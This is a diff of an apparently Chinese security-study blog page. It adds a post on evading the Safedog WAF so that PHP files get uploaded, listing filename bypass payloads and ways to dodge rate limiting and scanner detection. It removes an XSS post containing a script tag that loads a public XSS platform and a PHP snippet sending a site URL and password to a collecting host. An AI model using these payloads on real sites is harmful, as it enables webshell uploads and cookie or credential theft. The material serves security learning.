@@ -64,6 +64,57 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-WAF-安全狗绕过文件上传" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/12/23/WAF-%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="article-date">
+  <time datetime="2021-12-23T07:11:21.000Z" itemprop="datePublished">2021-12-23</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/12/23/WAF-%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">WAF-安全狗绕过文件上传</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="大多WAF-匹配原则"><a href="#大多WAF-匹配原则" class="headerlink" title="大多WAF 匹配原则"></a>大多WAF 匹配原则</h4><ol>
+<li>看见上传.php文件名马上拦截</li>
+<li>看见上传php.php文件名限制左边或者右边</li>
+</ol>
+<h4 id="上传参数"><a href="#上传参数" class="headerlink" title="上传参数"></a>上传参数</h4><p>Content-Disposition–用于接受表单数据<br>    一般可以任意修改，甚至删除<br>name–接受到的表单名<br>    不可修改<br>filename–上传文件名<br>    可以修改<br>Content-Type–MIME类型<br>    视情况定，需要考虑网站上传验证是否处理</p>
+<h4 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h4><p>①%00加url编码绕过<br>原理：利用截断加编码让waf匹配不到php后缀并且我们自己可以解析为php文件<br>filename=”x.php[%00].jpg”<br>②单双引号变异绕过：<br>原理：编程语言中变量后面一般都有双引号，有时候waf没有考虑到去掉引号而存在绕过<br>filename=”2’.php<br>filename=”‘2.php</p>
+<p>③双文件名绕过：<br>原理：开发waf的作者只考虑到了单个变量提交，而没考虑到我们复制一个filename，产生了循环，也就只匹配了第一个<br>filename= ;filename=”php.php”<br>④换行绕过：<br>原理：数据包的换行默认是\n，但是waf在检测的时候检测到的是x\n.\np\nh\np<br>filename=”x<br>.<br>p<br>h<br>p<br>“</p>
+<p>⑤参数溢出绕过<br>原理：waf检测的范围有限，没有考虑参数溢出的情况<br>Content-Disposition: form-data;[垃圾数据]; name=”file”;[垃圾数据];filename=”x.php”</p>
+<p>⑥重复参数绕过<br>原理：waf误认为提交的参数是正常的，因而不会检测后面的数据<br>filename=”Content-Disposition: form-data; name=”upload_file”;x.php”</p>
+<p>⑦数据截止绕过<br>filename=”a.jpg;.php”</p>
+<p>⑧fuzz绕过<br>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/-mo-/p/11221527.html">https://www.cnblogs.com/-mo-/p/11221527.html</a></p>
+<p>其他绕过payload：<br>filename=”‘.php<br>filename=”;2.php”</p>
+<h4 id="CC防护绕过"><a href="#CC防护绕过" class="headerlink" title="CC防护绕过"></a>CC防护绕过</h4><p>作用：检测数据包、检测速度<br>①未开CC绕过：模拟用户请求GET请求，比较简单，基本都有扫描防护<br>②开启CC绕过：<br>延时扫描<br>UA白名单<br>挂代理池</p>
+<h4 id="AWVS漏扫工具注入测试绕过"><a href="#AWVS漏扫工具注入测试绕过" class="headerlink" title="AWVS漏扫工具注入测试绕过"></a>AWVS漏扫工具注入测试绕过</h4><p>延时扫描，爬虫白名单<br>WAF扫描工具-wafw00f</p>
+<h4 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-mo-/p/11221527.html">https://www.cnblogs.com/-mo-/p/11221527.html</a>   文件上传fuzz字典生成脚本<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-chenxs/p/12324425.html">https://www.cnblogs.com/-chenxs/p/12324425.html</a>   WAF绕过参考方法<br><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/17JiEcLOmA0VX1o1f641kKw">https://pan.baidu.com/s/17JiEcLOmA0VX1o1f641kKw</a>    提取码：1111  安全狗apache4.0安装包<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cxd4321/p/14629633.html">https://www.cnblogs.com/cxd4321/p/14629633.html</a>    各大搜索引擎 User-Agent</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2021/12/23/WAF-%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" data-id="ckximtjzz000bvkvj5q5lgkne" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-WAF-安全狗绕过SQL注入" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/12/03/WAF-%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87SQL%E6%B3%A8%E5%85%A5/" class="article-date">
@@ -105,7 +156,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/12/03/WAF-%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87SQL%E6%B3%A8%E5%85%A5/" data-id="ckwpz2huw000a8kvjd9vthp54" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/12/03/WAF-%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87SQL%E6%B3%A8%E5%85%A5/" data-id="ckximtjzy000avkvj26a0f6ka" class="article-share-link">Share</a>
       
       
     </footer>
@@ -200,7 +251,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/11/28/XXE%E6%BC%8F%E6%B4%9E-%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/" data-id="ckwpz2huz000d8kvjeitwcauy" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/11/28/XXE%E6%BC%8F%E6%B4%9E-%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/" data-id="ckximtk01000evkvjfkog3q5e" class="article-share-link">Share</a>
       
       
     </footer>
@@ -268,7 +319,7 @@ echo $flag1;
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/11/26/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" data-id="ckwpz2hur00048kvj99vvc5t3" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/11/26/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" data-id="ckximtjzv0005vkvj2hkz2fnw" class="article-share-link">Share</a>
       
       
     </footer>
@@ -313,7 +364,7 @@ echo $flag1;
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/11/21/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E5%92%8Ctoken%E5%AE%89%E5%85%A8%E5%8F%8A%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6/" data-id="ckwpz2hvk001b8kvj310e7xep" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/11/21/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E5%92%8Ctoken%E5%AE%89%E5%85%A8%E5%8F%8A%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6/" data-id="ckximtk0r001evkvjhrop9rgv" class="article-share-link">Share</a>
       
       
     </footer>
@@ -362,7 +413,7 @@ echo $flag1;
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/11/16/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E2%80%94-%E5%90%84%E7%A7%8D%E8%B6%8A%E6%9D%83%E5%92%8C%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9/" data-id="ckwpz2hvl001c8kvj0fl17lx9" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/11/16/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E2%80%94-%E5%90%84%E7%A7%8D%E8%B6%8A%E6%9D%83%E5%92%8C%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9/" data-id="ckximtk0r001dvkvj815x8778" class="article-share-link">Share</a>
       
       
     </footer>
@@ -416,7 +467,7 @@ echo $flag1;
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/11/11/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/" data-id="ckwpz2hvi00178kvj0lv67phd" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/11/11/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/" data-id="ckximtk0m0018vkvj0a0rebh5" class="article-share-link">Share</a>
       
       
     </footer>
@@ -473,7 +524,7 @@ echo system($code);
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/11/04/RCE%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="ckwpz2hus00068kvjaas41jzr" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/11/04/RCE%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="ckximtjzw0007vkvj84480xsu" class="article-share-link">Share</a>
       
       
     </footer>
@@ -538,7 +589,7 @@ curl_close($ch);
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/11/01/CSRF%E5%92%8CSSRF%E6%BC%8F%E6%B4%9E/" data-id="ckwpz2hug00008kvj8oop9i6y" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/11/01/CSRF%E5%92%8CSSRF%E6%BC%8F%E6%B4%9E/" data-id="ckximtjzm0000vkvj70q76kaz" class="article-share-link">Share</a>
       
       
     </footer>
@@ -586,60 +637,7 @@ curl_close($ch);
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/29/xss%E6%BC%8F%E6%B4%9E-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E5%8F%8A%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" data-id="ckwpz2hv8000t8kvj3l4u3zb1" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-xss漏洞-基础分类及利用" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/10/26/xss%E6%BC%8F%E6%B4%9E-%E5%9F%BA%E7%A1%80%E5%88%86%E7%B1%BB%E5%8F%8A%E5%88%A9%E7%94%A8/" class="article-date">
-  <time datetime="2021-10-26T06:52:38.000Z" itemprop="datePublished">2021-10-26</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/10/26/xss%E6%BC%8F%E6%B4%9E-%E5%9F%BA%E7%A1%80%E5%88%86%E7%B1%BB%E5%8F%8A%E5%88%A9%E7%94%A8/">xss漏洞-基础分类及利用</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h4 id="XSS跨站漏洞常识"><a href="#XSS跨站漏洞常识" class="headerlink" title="XSS跨站漏洞常识"></a>XSS跨站漏洞常识</h4><p>本质：产生在浏览器前端js代码的漏洞<br>危害：js脚本能干嘛，他就能干嘛，一句话。前端页面能做的事它都能做。(不仅仅盗取cookie、修改页面等)<br>函数类型：都是输出型的函数(echo，print等等)<br>浏览器内核版本：自带浏览器禁用js</p>
-<h4 id="XSS跨站漏洞分类"><a href="#XSS跨站漏洞分类" class="headerlink" title="XSS跨站漏洞分类"></a>XSS跨站漏洞分类</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1、反射(非持续型)</span><br><span class="line">    跨站代码 -&gt;x.php-&gt;弹窗回显</span><br><span class="line">2、存储(持续型)</span><br><span class="line">    跨站代码 -&gt;x.php-&gt;与数据库进行交互-&gt;x.php-&gt;弹窗回显</span><br><span class="line">3、DOM-反射型XSS的一种</span><br><span class="line">    跨站代码 -&gt;x.php-&gt;本地浏览器静态前端代码-&gt;x.php-&gt;弹窗回显</span><br><span class="line"></span><br><span class="line">&lt;a href&#x3D;&#39;&#39;onclick&#x3D;&quot;alert(1)&quot;&#39;&gt;what do you see?&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<h5 id="DOM-究竟是什么？"><a href="#DOM-究竟是什么？" class="headerlink" title="DOM 究竟是什么？"></a>DOM 究竟是什么？</h5><p>文档对象模型（DOM）是 HTML 属性的一个特性。由于你的浏览器不理解 HTML，因此它会使用将 HTML 转换为 DOM 模型的解释器。<br>输出地点不同而导致结果不一致</p>
-<h4 id="Cookie与Session"><a href="#Cookie与Session" class="headerlink" title="Cookie与Session"></a>Cookie与Session</h4><p>判断用户信息的凭据<br>Cookie  存储在本地  持续时间长   安全性较低  小型企业   盗取cookie<br>Session  会话 存储在服务器  持续时间较短   安全性较高  适用于中大型企业   会话劫持-网络监听，中间人攻击</p>
-<h5 id="盗取cookie的前提条件"><a href="#盗取cookie的前提条件" class="headerlink" title="盗取cookie的前提条件"></a>盗取cookie的前提条件</h5><p>1、对方存在xss漏洞<br>2、对方管理员有保存账号密码<br>3、浏览器内核允许执行js脚本</p>
-<h4 id="XSS-常规攻击手法"><a href="#XSS-常规攻击手法" class="headerlink" title="XSS 常规攻击手法"></a>XSS 常规攻击手法</h4><p>1、xss平台    <a target="_blank" rel="noopener" href="https://xss8.cc/">https://xss8.cc/</a><br>    <sCRiPt sRC=//xss8.cc/ExO5></sCrIpT><br>2、工具<br>3、结合其他漏洞  CSRF跨站请求伪造</p>
-<h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>营销订单系统jfdd<br>Postman工具的简单使用<br>WebShell 箱子系统<br>    win7 –渗透者   win2008–服务器   本机—箱子管理员</p>
-<?php
-$password="admin";
-$url=$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
-echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
-?>
-<p>$_SERVER[‘PHP_SELF’] #当前正在执行脚本的文件名，与 document root相关。<br>$_SERVER[‘HTTP_HOST’] #当前请求的 Host: 头部的内容</p>
-<h4 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h4><p><a target="_blank" rel="noopener" href="https://xsshs.cn/xss.php?do=login">https://xsshs.cn/xss.php?do=login</a>   XSS平台<br><a target="_blank" rel="noopener" href="https://github.com/do0dl3/xss-labs">https://github.com/do0dl3/xss-labs</a>   XSS靶场<br><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1ZadZUPSFXqwB8eRG1gDZOw">https://pan.baidu.com/s/1ZadZUPSFXqwB8eRG1gDZOw</a>  提取码：5qm1  营销系统jfdd<br><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1I4LzRmBGH8qjGR6bwONvcw">https://pan.baidu.com/s/1I4LzRmBGH8qjGR6bwONvcw</a>     提取码：t8rj   Shell箱子系统<br><a target="_blank" rel="noopener" href="https://www.postman.com/downloads/">https://www.postman.com/downloads/</a>     Postman工具下载</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/26/xss%E6%BC%8F%E6%B4%9E-%E5%9F%BA%E7%A1%80%E5%88%86%E7%B1%BB%E5%8F%8A%E5%88%A9%E7%94%A8/" data-id="ckwpz2hva000v8kvjh6r77v40" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/10/29/xss%E6%BC%8F%E6%B4%9E-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E5%8F%8A%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" data-id="ckximtk0c000vvkvj0jgw3yke" class="article-share-link">Share</a>
       
       
     </footer>
@@ -685,6 +683,10 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
       <ul>
         
           <li>
+            <a href="/2021/12/23/WAF-%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">WAF-安全狗绕过文件上传</a>
+          </li>
+        
+          <li>
             <a href="/2021/12/03/WAF-%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87SQL%E6%B3%A8%E5%85%A5/">WAF-安全狗绕过SQL注入</a>
           </li>
         
@@ -698,10 +700,6 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
         
           <li>
             <a href="/2021/11/21/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E5%92%8Ctoken%E5%AE%89%E5%85%A8%E5%8F%8A%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6/">逻辑越权漏洞-验证码和token安全及找回机制</a>
-          </li>
-        
-          <li>
-            <a href="/2021/11/16/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E2%80%94-%E5%90%84%E7%A7%8D%E8%B6%8A%E6%9D%83%E5%92%8C%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9/">逻辑越权漏洞—-各种越权和数据篡改</a>
           </li>
         
       </ul>
